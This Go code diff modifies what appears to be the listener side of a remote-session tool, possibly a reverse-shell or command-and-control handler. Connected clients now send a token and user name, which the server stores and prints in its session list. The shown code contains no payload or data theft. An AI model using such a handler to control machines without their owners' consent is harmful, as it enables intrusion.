@@ -17,6 +17,7 @@ import(
 )
 
 var socks = make(map[string]socket.Socket)
+var socksUser = make(map[string]string)
 
 func connHandler(token string, sock socket.Socket){
   reader := bufio.NewReader(os.Stdin)
@@ -116,14 +117,25 @@ func main(){
       }
 
       if(conn != nil){
+        sock := socket.Init(conn, config.Key)
+        // get client information
+        id, _ := sock.Read()
+        ids := strings.Split(id, ":")    // TOKEN:USER
+        if len(ids) != 2 {
+          continue
+        }
+        token, user := ids[0], ids[1]
+
+        // generate socket and token
         for {
-          token := crypto.RandStringBytesMaskImprSrc(8)
-          if _, exist := socks[token]; !exist {
+          if _, exist := socks[token]; !exist && token != "" {
             sock := socket.Init(conn, config.Key)
             socks[token] = sock
+            socksUser[token] = user
             sock.Write(token)
             break
           }
+          token = crypto.RandStringBytesMaskImprSrc(8)
         }
       }
     }
@@ -156,7 +168,7 @@ func main(){
           continue
         }
 
-        fmt.Printf("%s %v\n", color.CyanString(k), v.RemoteAddr())
+        fmt.Printf("%s %v [%s]\n", color.CyanString(k), v.RemoteAddr(), color.YellowString(socksUser[k]))
       }
 
     case "c":
